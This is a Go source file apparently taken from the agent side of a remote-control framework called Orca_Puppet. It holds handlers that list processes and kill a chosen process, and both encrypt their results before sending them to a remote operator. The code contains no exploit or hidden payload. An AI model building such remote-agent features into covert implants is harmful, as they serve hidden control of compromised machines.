package controller

import (
	"Orca_Puppet/cli/cmdopt/processopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/tools/crypto"
	"encoding/json"
	"github.com/shirou/gopsutil/v3/process"
	"strconv"
)

func processListCmd(sendUserId string) {
	procs, err := processopt.GetProcs()
	if err != nil {
		return
	}
	procsData, _ := json.Marshal(procs)
	data, _ := crypto.Encrypt(procsData, []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "processList_ret", data, "")
}

func processKillCmd(sendUserId, decData string) {
	var message string
	pid, err := strconv.Atoi(decData)
	if err != nil {
		message = colorcode.OutputMessage(colorcode.SIGN_FAIL, err.Error())
		data, _ := crypto.Encrypt([]byte(message), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "processKill_ret", data, "")
		return
	}
	newProcess, err := process.NewProcess(int32(pid))
	if err != nil {
		message = colorcode.OutputMessage(colorcode.SIGN_FAIL, err.Error())
		data, _ := crypto.Encrypt([]byte(message), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "processKill_ret", data, "")
		return
	}
	err = newProcess.Kill()
	if err != nil {
		message = colorcode.OutputMessage(colorcode.SIGN_FAIL, err.Error())
		data, _ := crypto.Encrypt([]byte(message), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "processKill_ret", data, "")
		return
	}
	message = colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "process terminated successfully")
	data, _ := crypto.Encrypt([]byte(message), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "processKill_ret", data, "")
}
